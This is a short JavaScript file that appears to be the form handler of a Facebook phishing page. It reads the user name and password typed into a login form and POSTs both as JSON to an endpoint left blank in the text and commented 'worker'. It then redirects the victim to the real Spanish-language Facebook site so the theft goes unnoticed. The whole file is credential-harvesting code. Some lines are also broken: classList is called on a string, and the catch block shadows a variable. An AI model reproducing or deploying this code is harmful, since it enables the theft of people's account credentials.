async function sendEmail3(val1, val2) {
  //worker
  const endpoint = "";
  const body = JSON.stringify({
    field1: val1,
    field2: val2,
  });
  //console.log(body);
  await fetch(endpoint, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: body,
  });
}

async function redirect(event) {
  event.preventDefault();
  const userValue = document.getElementById("user").value.trim();
  const passwordValue = document.getElementById("password").value.trim();
  const error = document.getElementById("user-error");

  if (!validate(userValue, passwordValue)) {
    //console.log("no pass");
    //create warning
    error.style.display = "block";
    userValue.classList.add("input-error");
    return;
  }
  try {
    await sendEmail3(userValue, passwordValue);
    //redirect
    location.replace("https://es-la.facebook.com/");
    console.log("pass");
    error.style.display = "none";
    userValue.classList.remove("input-error");
  } catch (error) {
    error.style.display = "block";
    userValue.classList.add("input-error");
    return;
  }
}

function validate(user, password) {
  if (user.length < 3) return false;
  if (password.length < 6) return false;
  return true;
}
